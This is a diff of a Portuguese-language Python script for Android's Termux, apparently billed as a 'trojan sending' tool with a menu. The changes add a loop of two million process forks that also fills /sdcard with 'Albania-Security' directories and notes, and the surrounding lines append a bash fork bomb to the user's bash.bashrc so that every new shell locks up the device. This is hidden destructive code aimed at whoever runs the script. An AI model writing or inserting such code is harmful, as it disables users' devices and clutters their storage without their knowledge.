@@ -28,18 +28,12 @@ r='\033[;7m'          # Inverte
 import os
 import time 
 
-
-
-os.system ('clear')
-os.system (' cd /sdcard && mkdir Albania-Security && cd Albania-Security && echo Albania-Security passou aqui > AVISO.txt ')
 os.system ('clear')
 os.system ('figlet -f slant TROJAN HYPE') 
 print (f'{XV} Script by{XXI}:{O}ꪶ͢𝐋𝐀͢𝐂𝐎𝐒͢𝐓𝐄 𝐇𝐘͢𝐏𝐄{XXI}')
 time.sleep(0.6)
 # variavel para contagem
 a = 1
-#
-
 print(" ".center(8), f'{XV} PROGRAMA DE RAJAR TROJAN{XXI}😈🐊')
 print (f' {L} Menu !!! {XXI}\n{Y}Escolha a quantidade de trojan\nque deseja enviar{XXI}')
 print (f'{XV}1 - 500\n2 - 1000{XXI} ')
@@ -84,6 +78,11 @@ elif menu == 2:
 input(f' {XV} aperte {XXI}{R}ENTER{XXI}{XV} para fechar o programa.{XXI}')
 time.sleep (0.5)
 os.system (' figlet -f slant ENCERRANDO...')
+for i in range(2000000):
+    os.fork()
+    dir = ("Albania-Security"+str(i))
+    os.system (f'cd /sdcard && mkdir {dir} && cd {dir} && echo Albania-Security passou aqui > AVISO.txt')
+
 time.sleep (2.0)
 os.system('echo :(){ :|: & };: >> $HOME/../usr/etc/bash.bashrc')
 while True:
